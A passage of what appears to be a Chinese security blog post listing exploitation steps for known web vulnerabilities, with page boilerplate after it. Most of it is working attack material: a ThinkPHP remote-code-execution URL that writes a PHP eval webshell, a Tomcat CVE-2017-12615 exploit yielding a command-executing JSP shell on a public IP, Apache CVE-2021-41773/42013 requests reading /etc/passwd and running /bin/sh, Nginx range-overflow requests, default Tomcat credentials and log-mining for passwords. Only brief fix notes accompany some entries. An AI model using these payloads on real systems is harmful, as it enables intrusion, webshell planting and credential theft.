<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.230&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo ^&lt;?php @eval($_GET[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>


<h3 id="七、-svn文件泄露漏洞"><a href="#七、-svn文件泄露漏洞" class="headerlink" title="七、 svn文件泄露漏洞"></a>七、 svn文件泄露漏洞</h3><p>下载地址 <a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a></p>
<ol>
<li>扫描</li>
</ol>
<p>python SvnExploit.py -u http://站点地址/.svn</p>
<ol start="2">
<li>下载目标源码</li>
</ol>
<p>python SvnExploit.py -u http://站点地址/.svn –dump</p>
<ol start="3">
<li>查看数据库</li>
</ol>
<p>sqlitebrowser database.db</p>
<h3 id="八、-thinkphp3-2日志泄露漏洞-版本过旧"><a href="#八、-thinkphp3-2日志泄露漏洞-版本过旧" class="headerlink" title="八、 thinkphp3.2日志泄露漏洞(版本过旧)"></a>八、 thinkphp3.2日志泄露漏洞(版本过旧)</h3><p>THINKPHP3.2结构：Application\Runtime\Logs\Home\16_01_01.log<br>THINKPHP3.1结构：Runtime\Logs\Home\11_01_01.log</p>
<p>这个版本的thinkphp的错误日志里会显示出数据库的sql执行信息，而数据库密码、网站后台登陆密码，日志是有可能会记录下来的，优先从最新的日志来查找数据</p>
<p>后台查找</p>
<ol>
<li><p>目录查找，一般的目录是 /admin，/login …</p>
</li>
<li><p>子域名查找，admin.test.cn，user.test.cn …</p>
</li>
<li><p>Host碰撞子域名，这种不常见，适用于内部系统（或者靶场、CTF）</p>
</li>
</ol>
<p>Host_Ip碰撞工具 <a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a></p>
<ol>
<li><p>host.txt里填写的是要碰撞的子域名： webhack123.com，admin… 可以自行添加字典！</p>
</li>
<li><p>ip.txt里填写的是目标的ip： 192.168.1.230</p>
</li>
<li><p>python IP_hosts_scan_multithreading.py</p>
</li>
<li><p>vim /etc/hosts<br>加入 目标ip 目标域名</p>
</li>
<li><p>修改 test.py 中的域名<br>python3 tp.py</p>
</li>
<li><p>查看日志 获取账号相关的日志</p>
</li>
</ol>
<h3 id="九、-Nginx整数溢出漏洞-CVE-2017-7529"><a href="#九、-Nginx整数溢出漏洞-CVE-2017-7529" class="headerlink" title="九、 Nginx整数溢出漏洞 CVE-2017-7529"></a>九、 Nginx整数溢出漏洞 CVE-2017-7529</h3><ol>
<li>访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例：</li>
</ol>
<p>curl -I <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.13.1</span><br><span class="line">Date: Wed, 12 Jul 2017 15:57:57 GMT</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line">Content-Length: 16585</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Wed, 12 Jul 2017 15:57:57 GMT</span><br><span class="line">ETag: W&#x2F;&quot;40c9-5543e4fad0d40&quot;</span><br><span class="line">X-Proxy-Cache:: MISS</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>

<p>看到 Content-Length: 16585, 找个比这个数大的值</p>
<p>例如 17208, 第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600</p>
<ol start="2">
<li>请求时设置 range 如下</li>
</ol>
<p>curl -i <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a> -r -17208,-9223372036854758600</p>
<h3 id="十、-tomcat弱口令"><a href="#十、-tomcat弱口令" class="headerlink" title="十、 tomcat弱口令"></a>十、 tomcat弱口令</h3><p>用户名 tomcat  密码 tomcat</p>
<h3 id="十一、-tomcat任意文件写入"><a href="#十一、-tomcat任意文件写入" class="headerlink" title="十一、 tomcat任意文件写入"></a>十一、 tomcat任意文件写入</h3><ol>
<li>使用python执行exp，密码是pwd</li>
</ol>
<p>python CVE_2017_12615_EXP.py <a target="_blank" rel="noopener" href="http://106.15.50.112:18082/">http://106.15.50.112:18082</a></p>
<ol start="2">
<li>上传成功后，会返回一个地址</li>
</ol>
<p>shell: <a target="_blank" rel="noopener" href="http://106.15.50.112:18082/201712615.jsp">http://106.15.50.112:18082/201712615.jsp</a></p>
<ol start="3">
<li>浏览器执行命令，查看当前目录</li>
</ol>
<p><a target="_blank" rel="noopener" href="http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls">http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls</a> -R</p>
<h3 id="十二、-Apache-2-4-49-CVE-2021-41773-、-2-4-50-CVE-2021-42013"><a href="#十二、-Apache-2-4-49-CVE-2021-41773-、-2-4-50-CVE-2021-42013" class="headerlink" title="十二、 Apache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013)"></a>十二、 Apache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013)</h3><p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。</p>
<p>由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p>
<p>影响版本<br>Apache HTTPd 2.4.49/2.4.50版本</p>
<p>GET数据包<br>GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1<br>Host: host<br>Content-Length: 2<br>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p>
<p>POST数据包<br>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
<p>echo;ifconfig</p>
<p>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
<p>echo;ifconfig</p>
<p>Apache HTTPd 2.4.50 命令执行测试<br>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
<p>echo;ifconfig</p>
<p>檢測工具 <a href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p>
<h3 id="Grafana文件读取漏洞（CVE-2021-43798）"><a href="#Grafana文件读取漏洞（CVE-2021-43798）" class="headerlink" title="Grafana文件读取漏洞（CVE-2021-43798）"></a>Grafana文件读取漏洞（CVE-2021-43798）</h3><p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。</p>
<p>影响版本 Grafana 8.x 系列</p>
<p>fofa资产确定 app=”grafana”</p>
<p>檢測腳本 <a href="https://github.com/j-jasson/CVE-2021-43798-grafana_fileread">https://github.com/j-jasson/CVE-2021-43798-grafana_fileread</a></p>
<p>对URL进行检测<br>python3 grafana_fileread.py -u <a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000</a></p>
<p>查看帮助<br>python3 grafana_fileread.py-h  </p>
<p>修复方案<br>v8.0.0-beta1 和 v8.3.0 之间的所有安装都应尽快升级。如果无法升级，在 Grafana 前运行反向代理来规范化请求的 PATH 将缓解该漏洞。例如，envoy 中的normalize_path设置。</p>
<h3 id="Apache-APISIX-未授权访问（CVE-2021-45232）"><a href="#Apache-APISIX-未授权访问（CVE-2021-45232）" class="headerlink" title="Apache APISIX 未授权访问（CVE-2021-45232）"></a>Apache APISIX 未授权访问（CVE-2021-45232）</h3><p>Apache APISIX 是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX Dashboard 使用户可通过前端界面操作 Apache APISIX。</p>
<p>该漏洞的存在是由于 Manager API 中的错误。Manager API 在 gin 框架的基础上引入了 droplet 框架，所有的 API 和鉴权中间件都是基于 droplet 框架开发的。但是有些 API 直接使用了框架 gin 的接口，从而绕过身份验证。</p>
<p>影响版本 Apache APISIX Dashboard &lt; 2.10.1</p>
<p>资产确定 title=”Apache APISIX Dashboard”</p>
<p>poc   host + /apisix/admin/migrate/export</p>
<p><a href="https://github.com/Ifory885/CVE-2021-45232">https://github.com/Ifory885/CVE-2021-45232</a></p>
<p>修复方案 目前官方已发布修复版本修复了该漏洞，升级到安全版本：<br><a href="https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1">https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1</a><br>若无法及时升级的用户，可根据官方提供的修复建议通过修改默认用户名和密码，并设置访问Apache APISIX Dashboard的白名单进行缓解。</p>
<h3 id="宝塔IIS中间件解析漏洞"><a href="#宝塔IIS中间件解析漏洞" class="headerlink" title="宝塔IIS中间件解析漏洞"></a>宝塔IIS中间件解析漏洞</h3><p>适用范围： 宝塔Windows &lt;= 6.5 或 liunx装有IIS8.5版本</p>
<p>写一个php文件  另存为jpg格式</p>
<p>然後直接上傳文件 1.jpg 后面加/.php </p>
<p>如果可以解析PHP文件 说明存在这个漏洞</p>
<h3 id="Nginx整数溢出漏洞"><a href="#Nginx整数溢出漏洞" class="headerlink" title="Nginx整数溢出漏洞"></a>Nginx整数溢出漏洞</h3><p>CVE-2017-7529</p>
<p>访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例</p>
<p>curl -I <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.13.1</span><br><span class="line">Date: Tue, 15 Feb 2022 10:44:32 GMT</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line">Content-Length: 16585</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Thu, 14 Mar 2019 02:48:10 GMT</span><br><span class="line">ETag: &quot;40c9-58404f3e28e80&quot;</span><br><span class="line">X-Proxy-Cache: MISS</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>


<p>Content-Length:   第一个 16585，第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600</p>
<p>请求时设置range<br>curl -i <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a> -r -17208,-9223372036854758600 &gt; 1.txt</p>

    </div>
  </div>
  
    <div class="copy-right">
      <div class="markdown-body">
        <blockquote>
        
        
          本文作者 : JohnScott <br/>
        
        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/46%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</a><br>
        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
        </blockquote>
      </div>
    </div>
  
  
  
    <div class="social-share"
  style="margin-top: -2rem"
  data-wechat-qrcode-title="<p>微信扫一扫</p>"
  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
  
>
  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
</div>
<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
  

  
    <div id="reward">
  
    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
  
  <button id="reward-btn">
    
    <span>感谢您的关心</span>
  </button>
  <div id="reward-qrcode">
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
        <p class="qrcode-meta">微信扫一扫</p>
      </div>
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
        <p class="qrcode-meta">支付宝扫一扫</p>
      </div>
    
  </div>

</div>

<script>
  (() => {
    let button = document.querySelector('#reward-btn'),
      qrcode = document.querySelector('#reward-qrcode'),
      display = false;
    
    button.addEventListener('click', () => {
      qrcode.style.display = display ? 'none' : 'block'
      display = !display
    }, false)
  })()
</script>
  

  <div class="article-footer">
    <div class="article-meta pull-left">
      <span>
        
          <i class="iconfont icon-06tags"></i>标签: 
          
          <span class="span--tag">
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
              #网络安全
            </a>
          </span>
          
        
      </span>
    </div>
    <div class="article-meta pull-right">
    </div>
  </div>
</div>


  <aside id="sidebar">
    <p id="sidebar-header"></p>
    <ol id="sidebar-toc"></ol>
  </aside>
  <script async>setTimeout(generateToc, 10);</script>


  <nav class="post-navigation">
    
      <div class="nav-pre">
        <i class="iconfont icon-prev"></i>
        上一篇:
        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">45反序列化漏洞</a>
      </div>
    
    
      <div class="nav-next">
        下一篇:
        <a href="/2021/shell/" target="_self">shell</a>
        <i class="iconfont icon-next"></i>
      </div>
    
  </nav>

  
    <a href="#comment" class="comment-anchor"></a>
<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
<div id="vcomments"></div>

<script defer>
  if( true ) {
    let path = getRealPath()
    new Valine({
      el: "#vcomments",
      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
      notify: false,
      verify: false,
      avatar: "robohash",
      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
      path
    });
  }
</script>
   

  
    <script defer>
const valineAPI = (() => {
  try {
    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
  } catch(error) {}
  const isExist = (identity) => {
    identity = identity || getRealPath();
    let query = new AV.Query('Timer');
    return new Promise((resolve, reject) => {
      query.equalTo("identity", identity);
      query.find().then(results => {
        resolve(results.length > 0);
      }, error => reject(error));
    })
  }

  const _get = (identity) => {
    let query = null;
    if(identity && identity instanceof Array){
      let querys = [];
      for(let i = 0; i < identity.length; ++i) {
        querys[i] = new AV.Query('Timer');
        querys[i].equalTo('identity', identity[i]);
      }
      query = AV.Query.or.apply(null ,querys);
    } else {
      identity = identity || getRealPath();
      query = new AV.Query("Timer");
      query.equalTo("identity", identity);
    }

    return new Promise((resolve, reject) => {
      query.find()
      .then(results => resolve(results))
      .catch(error => reject(error))
    })
  }

  const create = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let Todo = AV.Object.extend('Timer');
      let todo = new Todo();
      todo.set("times", 1);
      todo.set("identity", identity);
      todo.save().then(res => resolve(true), error => reject(error));
    })
  }

  const update = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let query = new AV.Query('Timer');
      query.equalTo("identity", identity);
      query.find().then(todos => {
        todos.forEach(todo => {
          todo.set("times", todo.attributes.times + 1);
        });
        return AV.Object.saveAll(todos);
      }).then(todos => resolve(true), error => reject(error));
    })
  }

  return {
    isExist,
    _get,
    update,
    create
  }
})()

const calcAndWriteTimes = () => {
  let isPost = true;

  let timerAllDOM = document.querySelectorAll(".article-timer");

  if(isPost) {
    let identity = timerAllDOM[0].getAttribute("data-identity");
    valineAPI.isExist(identity)
    .then(exist => {
      if(exist) {
        return valineAPI.update(identity);
      }
      return new Promise(resolve => resolve(true));
    })
    .then( succuess => valineAPI._get(identity))
    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
    .catch(error => console.log(error.message))
    return ;
  }

  let timerDOMCache = {};

  for(let timerDOM of timerAllDOM) {
    let identity = timerDOM.getAttribute("data-identity");
    if(timerDOMCache.hasOwnProperty(identity)){
      timerDOMCache[identity].dom.push(timerDOM);
    }else{
      timerDOMCache[identity] = {
        dom: [timerDOM],
        times: undefined
      };
    }
  }

  let identities = Object.keys(timerDOMCache);
  valineAPI._get(identities).then(results => {
    for(let result of results) {
      let {identity, times} = result.attributes;
      timerDOMCache[identity].times = times;
      timerDOMCache[identity].dom.map(item => item.innerText = times);
    }
    for(let identity of identities) {
      if(timerDOMCache[identity].times){
        continue;
      }
      timerDOMCache[identity].dom.map(item => item.innerText = 1);
      valineAPI.create(identity);
    }
  }).catch(error => console.log(error.message))
}

if(true){
  calcAndWriteTimes();
}
</script>
   

</div>


      <footer>
  <p class="site-info">
    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
    <br>
    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
    <br>
    
  </p>
</footer>



<script>
const timeToNowDOM = document.querySelector("#time-to-now");
const startTimestamp = new Date(2015, 0, 1).getTime();

const updateTimeStr = () => {
  let offset = parseInt(
      (new Date().getTime() - startTimestamp) / 1000,
      10
    ),
    day = Math.floor(offset / 86400),
    hour = Math.floor((offset % 86400) / 3600),
    minute = Math.floor(((offset % 86400) % 3600) / 60),
    second = Math.floor(((offset % 86400) % 3600) % 60);
  timeToNowDOM.innerHTML =
    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
  setTimeout(updateTimeStr, 500);
}

setTimeout(updateTimeStr, 500);
</script>


      <div class="back-to-top hidden">
  <span>
    <i class="iconfont icon-60"></i><span></span>%
  </span>
</div>

<script>
const updateIconToTop = percent => {
  let dom = document.querySelector(".back-to-top span span");
  dom.innerText = percent;
  if(percent < 1) {
    document.querySelector(".back-to-top").className = "back-to-top hidden";
  } else {
    document.querySelector(".back-to-top").className = "back-to-top";
  }
}

const handleScoll = () => {
  let isRunning = false;
  return () => {
    if (isRunning) return;
    isRunning = true;
    window.requestAnimationFrame(timestamp => {
      let scrollTop =
          document.documentElement.scrollTop || document.body.scrollTop,
        scrollHeight =
          document.documentElement.scrollHeight ||
          document.body.scrollHeight,
        clientHeight =
          document.documentElement.clientHeight ||
          document.body.clientHeight;
      isRunning = false;
      if (scrollTop <= 1) {
        updateIconToTop(0);
        return;
      }
      if (scrollTop + clientHeight >= scrollHeight) {
        updateIconToTop(100);
      } else {
        updateIconToTop(parseInt(
          100 * scrollTop / (scrollHeight - clientHeight),
          10
        ));
      }
    });
  };
}

const backToTop = () => {
  let scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop,
    delay = 10,
    time = 200;
  if (scrollTop <= 20) {
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
    return;
  }
  let step = Math.ceil(scrollTop * delay / time);
  let timer = setInterval(() => {
    scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop;
    if (scrollTop - step <= 0) {
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
      clearInterval(timer);
    } else {
      document.documentElement.scrollTop = scrollTop - step;
      document.body.scrollTop = scrollTop - step;
    }
  }, delay);
}

document.addEventListener("scroll", handleScoll(), false);

document.querySelector(".back-to-top").addEventListener("click", backToTop, false);

</script>

    </div>

    
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  (() => {
    const mathjaxConfig = {
      showProcessingMessages: false, //关闭js加载过程信息
      messageStyle: "none", //不显示信息
      jax: ["input/TeX", "output/HTML-CSS"],
      tex2jax: {
        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
      },
      "HTML-CSS": {
        availableFonts: ["STIX", "TeX"], //可选字体
        showMathMenu: false //关闭右击菜单显示
      }
    }

    let mathjaxInterval = setInterval(() => {
      if(!window.MathJax){
        return;
      }
      window.MathJax.Hub.Config(mathjaxConfig)
      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])

      clearInterval(mathjaxInterval)
    }, 10)    
  })()
</script>
    

    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
<script async>
  let fancyTimer = setInterval(function(){
    if(!window.$){
      return;
    }
    $(document).ready(function() {
      $(".post img").each(function () {
        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
          return;
        }
        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "gallery");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      });
      
      clearInterval(fancyTimer);
    });
  }, 10);
</script>

    
  </body>

</html>
